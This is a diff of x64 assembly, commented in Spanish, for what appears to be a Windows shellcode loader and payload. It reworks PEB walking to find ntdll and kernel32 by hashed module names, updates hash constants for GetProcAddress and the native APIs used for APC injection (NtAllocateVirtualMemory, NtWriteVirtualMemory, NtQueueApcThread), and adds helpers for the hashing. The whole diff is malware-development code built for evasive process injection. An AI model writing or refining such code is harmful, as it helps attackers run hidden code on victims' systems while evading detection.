@@ -52,18 +52,30 @@ _start:
     pop rbx
     and rsp, -16
 
-    ; --- PEB walking ---
+    ; --- PEB walking dinámico ---
     mov rax, [gs:0x60]
     mov rax, [rax+0x18]
-    mov rax, [rax+0x20]
-    mov r8, [rax]
-    mov r15, [r8+0x30]          ; ntdll.dll
-    mov r9, [r8]
-    mov r14, [r9+0x30]          ; kernel32.dll
+    mov rsi, [rax+0x20]         ; InMemoryOrderModuleList (Flink)
+.walk_modules_loader:
+    mov rdx, [rsi+0x50]         ; BaseDllName.Buffer
+    movzx r8, word [rsi+0x48]   ; BaseDllName.Length
+    call .hash_unicode_lower_loader
+    cmp eax, 0xCEF73022         ; hash("ntdll.dll")
+    jne .check_k32_loader
+    mov r15, [rsi+0x20]         ; r15 = ntdll.dll base
+    jmp .next_mod_loader
+.check_k32_loader:
+    cmp eax, 0x8FECD6FF         ; hash("kernel32.dll")
+    jne .next_mod_loader
+    mov r14, [rsi+0x20]         ; r14 = kernel32.dll base
+.next_mod_loader:
+    mov rsi, [rsi]              ; Flink
+    cmp rsi, [rax+0x20]         ; Back to head?
+    jne .walk_modules_loader
 
     ; --- Resolver GetProcAddress por hash ---
     mov rcx, r14
-    mov edx, 0x7C0DFCAA
+    mov edx, 0x7C0E34AA         ; GetProcAddress (ROR13 + len)
     call .get_export_by_hash_loader
     mov r13, rax                ; r13 = GetProcAddress
 
@@ -182,7 +194,17 @@ _start:
 .loop_loader:
     mov edi, [rsi + r8*4]
     add rdi, rcx
+    
+    ; Calcular longitud del nombre para la semilla (ROR13 + len)
     xor eax, eax
+    mov r9, rdi
+.len_loader:
+    cmp byte [r9], 0
+    jz .hash_loader
+    inc eax
+    inc r9
+    jmp .len_loader
+
 .hash_loader:
     movzx r9d, byte [rdi]
     test r9b, r9b
@@ -207,6 +229,29 @@ _start:
     inc r8
     jmp .loop_loader
 
+; Helper para PEB walking en el loader
+.hash_unicode_lower_loader:
+    push rdx
+    movzx eax, r8w
+    shr eax, 1                  ; Seed = char count
+.hash_loop_unicode:
+    movzx r9d, word [rdx]
+    test r9w, r9w
+    jz .hash_done_unicode
+    cmp r9w, 'A'
+    jl .no_lower_loader
+    cmp r9w, 'Z'
+    jg .no_lower_loader
+    add r9w, 32                 ; tolower
+.no_lower_loader:
+    ror eax, 13
+    add eax, r9d
+    add rdx, 2
+    jmp .hash_loop_unicode
+.hash_done_unicode:
+    pop rdx
+    ret
+
 ; ========================================================================
 ; PAYLOAD: Entry Point en MEM_MAPPED
 ; ========================================================================
@@ -217,18 +262,30 @@ payload_entry:
     pop rbx
     and rsp, -16
 
-    ; --- PEB walking ---
+    ; --- PEB walking dinámico ---
     mov rax, [gs:0x60]
     mov rax, [rax+0x18]
-    mov rax, [rax+0x20]
-    mov r8, [rax]
-    mov r15, [r8+0x30]          ; ntdll.dll
-    mov r9, [r8]
-    mov r14, [r9+0x30]          ; kernel32.dll
+    mov rsi, [rax+0x20]
+.walk_modules_payload:
+    mov rdx, [rsi+0x50]
+    movzx r8, word [rsi+0x48]
+    call .hash_unicode_lower_payload
+    cmp eax, 0xCEF73022
+    jne .check_k32_payload
+    mov r15, [rsi+0x20]
+    jmp .next_mod_payload
+.check_k32_payload:
+    cmp eax, 0x8FECD6FF
+    jne .next_mod_payload
+    mov r14, [rsi+0x20]
+.next_mod_payload:
+    mov rsi, [rsi]
+    cmp rsi, [rax+0x20]
+    jne .walk_modules_payload
 
     ; --- Resolver GetProcAddress (kernel32) por hash ---
     mov rcx, r14
-    mov edx, 0x7C0DFCAA
+    mov edx, 0x7C0E34AA         ; GetProcAddress
     call .get_export_by_hash_payload
     mov r13, rax                ; r13 = GetProcAddress
 
@@ -359,17 +416,17 @@ payload_entry:
 .apc_phase:
     ; --- Resolver NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread ---
     mov rcx, r15
-    mov edx, 0x34BDFC62         ; NtAllocateVirtualMemory
+    mov edx, 0xD61BCABD         ; NtAllocateVirtualMemory
     call .get_export_by_hash_payload
     mov [rbx + (pNtAllocateVirtualMemory - payload_start)], rax
 
     mov rcx, r15
-    mov edx, 0x4CEC1E4A         ; NtWriteVirtualMemory
+    mov edx, 0x05108CC4         ; NtWriteVirtualMemory
     call .get_export_by_hash_payload
     mov [rbx + (pNtWriteVirtualMemory - payload_start)], rax
 
     mov rcx, r15
-    mov edx, 0x9C0BBD12         ; NtQueueApcThread
+    mov edx, 0x52F9A746         ; NtQueueApcThread
     call .get_export_by_hash_payload
     mov [rbx + (pNtQueueApcThread - payload_start)], rax
 
@@ -568,7 +625,17 @@ payload_entry:
     jae .not_found_payload
     mov edi, [rsi + r8*4]
     add rdi, rcx
+    
+    ; Calcular longitud del nombre para la semilla (ROR13 + len)
     xor eax, eax
+    mov r9, rdi
+.len_payload:
+    cmp byte [r9], 0
+    jz .hash_payload
+    inc eax
+    inc r9
+    jmp .len_payload
+
 .hash_payload:
     movzx r9d, byte [rdi]
     test r9b, r9b
@@ -598,6 +665,29 @@ payload_entry:
     xor eax, eax
     xor r9d, r9d
     pop r11 r10 r8 rdi rsi rbx
+    ret
+
+; Helper para PEB walking en el payload
+.hash_unicode_lower_payload:
+    push rdx
+    movzx eax, r8w
+    shr eax, 1                  ; Seed = char count
+.hash_loop_unicode_p:
+    movzx r9d, word [rdx]
+    test r9w, r9w
+    jz .hash_done_unicode_p
+    cmp r9w, 'A'
+    jl .no_lower_payload
+    cmp r9w, 'Z'
+    jg .no_lower_payload
+    add r9w, 32                 ; tolower
+.no_lower_payload:
+    ror eax, 13
+    add eax, r9d
+    add rdx, 2
+    jmp .hash_loop_unicode_p
+.hash_done_unicode_p:
+    pop rdx
     ret
 
 ; ========================================================================
